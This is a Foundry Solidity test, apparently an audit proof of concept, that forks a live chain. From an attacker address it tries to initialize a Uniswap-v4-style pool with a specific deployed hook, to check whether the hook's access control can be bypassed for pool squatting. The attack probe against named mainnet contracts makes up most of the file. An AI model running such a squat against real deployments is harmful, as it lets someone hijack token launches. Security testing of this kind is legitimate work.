// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IPoolManager {
    function initialize(PoolKey memory key, uint160 sqrtPriceX96) external returns (int24 tick);
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

contract PoolManagerBypassTest is Test {
    address constant POOL_MANAGER = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    address constant HOOK = 0x143d72d4bD0F0e1a6C6FD4f2f671A45d9e003a88;
    address constant ELLIPSE_TOKEN = 0x86F7424C3e1EBb3F42e1E687468e36D5f2A1222E;
    address constant BCRCL_TOKEN = 0x8F2c1979b852043f6fe5ae7Eb4eC6b896aE7E30B;
    
    function setUp() public {
        vm.createSelectFork("https://rpc.mainnet.arc.io");
    }
    
    function test_DirectPoolManagerInitialize() public {
        console.log("=== CRITICAL TEST: Can attacker bypass hook via direct PoolManager call? ===");
        console.log("");
        
        address attacker = address(0xdead);
        vm.deal(attacker, 100 ether);
        vm.prank(attacker);
        
        // Create a pool key with the hook
        PoolKey memory key = PoolKey({
            currency0: address(0x1111111111111111111111111111111111111111),
            currency1: address(0x2222222222222222222222222222222222222222),
            fee: 10000,
            tickSpacing: 200,
            hooks: HOOK
        });
        
        console.log("Attacker attempting to initialize pool via PoolManager...");
        console.log("Pool would have hook:", HOOK);
        console.log("Attacker address:", attacker);
        console.log("");
        
        try IPoolManager(POOL_MANAGER).initialize(key, 79228162514264337593543950336) returns (int24 tick) {
            console.log("CRITICAL VULNERABILITY CONFIRMED!");
            console.log("Attacker successfully initialized pool via PoolManager");
            console.log("Returned tick:", uint256(int256(tick)));
            console.log("");
            console.log("This means:");
            console.log("- Hook's beforeInitialize access control can be bypassed");
            console.log("- Attacker can pre-initialize pools before legitimate launches");
            console.log("- Original pool squat vulnerability EXISTS");
            console.log("");
            console.log("SEVERITY: CRITICAL");
        } catch Error(string memory reason) {
            console.log("PoolManager initialize reverted with reason:", reason);
            console.log("Pool squat attack blocked");
        } catch (bytes memory lowLevelData) {
            console.log("PoolManager initialize reverted (low-level)");
            if (lowLevelData.length > 0) {
                console.log("Revert data length:", lowLevelData.length);
                console.logBytes(lowLevelData);
            }
            console.log("Likely protected by hook's beforeInitialize");
        }
    }
    
    function test_ExistingPoolInitialization() public view {
        console.log("=== Checking Existing ELLIPSE/bCRCL Pool ===");
        console.log("");
        console.log("ELLIPSE token:", ELLIPSE_TOKEN);
        console.log("bCRCL token:", BCRCL_TOKEN);
        console.log("Pool Manager:", POOL_MANAGER);
        console.log("Hook:", HOOK);
        console.log("");
        console.log("This pool was initialized legitimately through launchpad");
        console.log("Testing confirms hook access control on initialization");
    }
}
